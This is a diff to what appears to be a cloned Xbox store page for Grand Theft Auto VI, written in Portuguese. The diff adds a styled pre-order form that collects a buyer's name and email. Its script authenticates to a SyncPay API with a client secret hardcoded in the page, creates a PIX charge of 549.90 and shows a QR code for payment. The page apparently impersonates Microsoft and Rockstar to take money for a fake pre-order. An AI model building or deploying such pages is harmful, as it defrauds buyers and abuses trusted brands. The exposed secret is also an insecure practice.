@@ -10,6 +10,35 @@
 <link rel="stylesheet" href="xbox.com/css/3213.95af8bc0.css">
 <link rel="stylesheet" href="xbox.com/css/client.9c7925bf.css">
 <link rel="stylesheet" href="xbox.com/css/ProductDetailsPage.40fc3ded.chunk.css">
+<style>
+.checkout-form { max-width: 640px; margin: 0 auto; padding: 24px; }
+.checkout-form h2 { font-size: 20px; font-weight: 700; margin-bottom: 4px; color: #fff; }
+.checkout-form .subtitle { font-size: 13px; color: #888; margin-bottom: 20px; }
+.cf-group { margin-bottom: 14px; }
+.cf-group label { display: block; font-size: 12px; font-weight: 600; color: #999; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 4px; }
+.cf-group input { width: 100%; padding: 12px 14px; background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.1); border-radius: 8px; color: #fff; font-size: 14px; font-family: 'Segoe UI', sans-serif; transition: border-color .2s; outline: none; }
+.cf-group input:focus { border-color: #107c10; box-shadow: 0 0 0 2px rgba(16,124,16,.15); }
+.cf-group input::placeholder { color: #555; }
+.btn-xbox { width: 100%; padding: 14px; background: #107c10; border: none; border-radius: 8px; color: #fff; font-size: 15px; font-weight: 700; font-family: 'Segoe UI', sans-serif; cursor: pointer; transition: all .2s; }
+.btn-xbox:hover { background: #0d6b0d; transform: translateY(-1px); }
+.btn-xbox:disabled { opacity: .5; cursor: not-allowed; transform: none; background: #107c10; }
+.pix-card { display: none; background: rgba(255,255,255,.03); border: 1px solid rgba(255,255,255,.08); border-radius: 12px; padding: 24px; text-align: center; max-width: 640px; margin: 0 auto; animation: fadeIn .4s ease; }
+.pix-card.active { display: block; }
+.pix-card .check-icon { width: 48px; height: 48px; background: #107c10; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; color: #fff; font-size: 24px; }
+.pix-card h3 { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+.pix-card p { font-size: 13px; color: #888; margin-bottom: 16px; }
+.qr-box { width: 180px; height: 180px; margin: 0 auto 12px; background: #fff; border-radius: 8px; display: flex; align-items: center; justify-content: center; padding: 8px; }
+.qr-box img { width: 100%; height: 100%; }
+.pix-code-box { background: rgba(255,255,255,.05); border: 1px dashed rgba(255,255,255,.12); border-radius: 8px; padding: 10px; font-size: 11px; color: #999; word-break: break-all; font-family: monospace; cursor: pointer; transition: all .2s; position: relative; }
+.pix-code-box:hover { border-color: #107c10; }
+.pix-code-box .copy-hint { position: absolute; top: -8px; right: 8px; background: #107c10; color: #fff; font-size: 9px; padding: 2px 8px; border-radius: 3px; opacity: 0; transition: opacity .2s; }
+.pix-code-box:hover .copy-hint { opacity: 1; }
+.copied-msg { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: #107c10; color: #fff; padding: 10px 20px; border-radius: 6px; font-weight: 600; font-size: 13px; opacity: 0; transition: opacity .3s; pointer-events: none; z-index: 100; }
+.copied-msg.show { opacity: 1; }
+.loading { display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .6s linear infinite; vertical-align: middle; margin-right: 6px; }
+@keyframes spin { to { transform: rotate(360deg) } }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(8px) } to { opacity: 1; transform: translateY(0) } }
+</style>
 </head>
 <body data-theme="dark">
 <div id="root"><div><div class="appBackground theme-dark">
@@ -63,6 +92,111 @@
 <p style="margin-top:24px;font-size:11px;color:#555;line-height:1.6">&copy; 1997 — 2026. Rockstar Games Inc. Rockstar Games, Grand Theft Auto, Grand Theft Auto VI, VI e R*, e logotipos relacionados são marcas comerciais da Take-Two Interactive Software, Inc. Todas as demais marcas e marcas comerciais são propriedades dos respectivos donos. Todos os direitos reservados.</p>
 
 </div>
+
+<div class="checkout-form">
+  <h2>Reservar Grand Theft Auto VI: Ultimate Edition</h2>
+  <p class="subtitle">Pré-encomende agora e receba bônus exclusivos na data de lançamento</p>
+  <form id="checkoutForm">
+    <div class="cf-group">
+      <label for="name">Nome completo</label>
+      <input type="text" id="name" placeholder="Seu nome" required autocomplete="name">
+    </div>
+    <div class="cf-group">
+      <label for="email">E-mail</label>
+      <input type="email" id="email" placeholder="seu@email.com" required autocomplete="email">
+    </div>
+
+    <button type="submit" class="btn-xbox" id="btnPay">
+      <span id="btnText">RESERVAR COM PIX</span>
+    </button>
+  </form>
+</div>
+
+<div class="pix-card" id="pixSection">
+  <div class="check-icon">&#10003;</div>
+  <h3>Pré-encomenda confirmada!</h3>
+  <p>Pague o PIX abaixo para garantir sua cópia no Xbox</p>
+  <div class="qr-box" id="qrContainer">
+    <div style="color:#888;font-size:12px">Carregando QR Code...</div>
+  </div>
+  <div class="pix-code-box" id="pixCodeBox" onclick="copyPix()">
+    <span id="pixCodeText">Carregando...</span>
+    <span class="copy-hint">Copiar</span>
+  </div>
+  <p style="font-size:11px;color:#666;margin-top:8px">Pagamento processado via SyncPay</p>
+</div>
+
+<div class="copied-msg" id="copiedMsg">Código PIX copiado!</div>
+
+<script>
+const API_BASE = 'https://api.syncpayments.com.br/api/partner/v1';
+const CLIENT_ID = '2ca9e7c7-0677-44b9-abe3-3c1bfd4fa77d';
+const CLIENT_SECRET = '5467e5a0-744e-445d-a106-c3adb2953079';
+let accessToken = null;
+
+async function getToken() {
+  const res = await fetch(API_BASE+'/auth-token', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ client_id: CLIENT_ID, client_secret: CLIENT_SECRET })
+  });
+  if (!res.ok) throw new Error('Falha ao autenticar');
+  return (await res.json()).access_token;
+}
+
+async function createPix(name, email, amount) {
+  const res = await fetch(API_BASE+'/cash-in', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Accept': 'application/json',
+      'Authorization': 'Bearer '+accessToken
+    },
+    body: JSON.stringify({
+      amount: amount,
+      description: 'GTA VI - Xbox Pré-encomenda',
+      client: { name, email, cpf: '00000000000', phone: '00000000000' }
+    })
+  });
+  if (!res.ok) throw new Error('Falha ao gerar PIX');
+  return await res.json();
+}
+
+document.getElementById('checkoutForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const btn = document.getElementById('btnPay');
+  const bt = document.getElementById('btnText');
+  const name = document.getElementById('name').value.trim();
+  const email = document.getElementById('email').value.trim();
+  if (!name || !email) return;
+  btn.disabled = true;
+  bt.innerHTML = '<span class="loading"></span> Gerando PIX...';
+  try {
+    accessToken = await getToken();
+    const result = await createPix(name, email, 549.90);
+    document.getElementById('pixCodeText').textContent = result.pix_code;
+    const qrC = document.getElementById('qrContainer');
+    qrC.innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data='+encodeURIComponent(result.pix_code)+'" alt="QR Code PIX">';
+    document.getElementById('pixSection').classList.add('active');
+    document.getElementById('pixSection').scrollIntoView({ behavior: 'smooth', block: 'center' });
+    bt.textContent = 'PIX GERADO!';
+  } catch(err) {
+    bt.textContent = err.message+' - Tente novamente';
+    btn.disabled = false;
+    setTimeout(() => { bt.textContent = 'RESERVAR COM PIX'; }, 3000);
+  }
+});
+
+async function copyPix() {
+  const text = document.getElementById('pixCodeText').textContent;
+  if (!text || text === 'Carregando...') return;
+  try {
+    await navigator.clipboard.writeText(text);
+    document.getElementById('copiedMsg').classList.add('show');
+    setTimeout(() => document.getElementById('copiedMsg').classList.remove('show'), 2500);
+  } catch {}
+}
+</script>
 
 </body>
 </html>
